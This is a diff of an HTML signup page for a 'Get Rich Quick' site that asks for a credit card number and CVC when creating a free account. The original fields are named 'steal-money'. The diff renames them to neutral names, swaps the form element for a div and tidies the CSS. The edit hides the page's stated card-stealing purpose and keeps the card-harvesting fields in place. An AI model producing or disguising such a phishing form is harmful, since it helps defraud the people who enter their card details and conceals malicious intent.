@@ -22,7 +22,9 @@
         }
         .signup-form {
             background-color: #fff;
-            border: 1px solid #ddd;
+            border-color: #ddd;
+            border-width: 1px;
+            border-style: solid;
             padding: 20px;
             display: inline-block;
             text-align: left;
@@ -37,7 +39,9 @@
             width: 100%;
             padding: 10px;
             margin-bottom: 10px;
-            border: 1px solid #ddd;
+            border-color: #ddd;
+            border-width: 1px;
+            border-style: solid;
             border-radius: 5px;
         }
         .signup-form button {
@@ -68,7 +72,7 @@
     </div>
     <div class="content">
         <h2>Create Your Free Account</h2>
-        <form class="signup-form">
+        <div class="signup-form">
             <label for="name">Full Name</label>
             <input type="text" class="name" name="name" required>
             
@@ -78,14 +82,14 @@
             <label for="password">Password</label>
             <input type="password" class="password" name="password" required>
             
-            <label for="steal-money">Credit Card Number</label>
-            <input class="steal-money" name="steal-money" required>
+            <label for="credit-card-number">Credit Card Number</label>
+            <input type="text" class="credit-card-number" name="credit-card-number" required>
             
-            <label for="steal-money2">Credit Card CVC Number</label>
-            <input class="steal-money" name="steal-money2" required>
+            <label for="credit-card-cvc">Credit Card CVC Number</label>
+            <input type="text" class="credit-card-cvc" name="credit-card-cvc" required>
 
             <button type="submit">Sign Up Now</button>
-        </form>
+        </div>
     </div>
     <div class="footer">
         <p>&copy; 2024 Get Rich Quick | <a href="privacy-policy.html" style="color: #fff;">Privacy Policy</a></p>
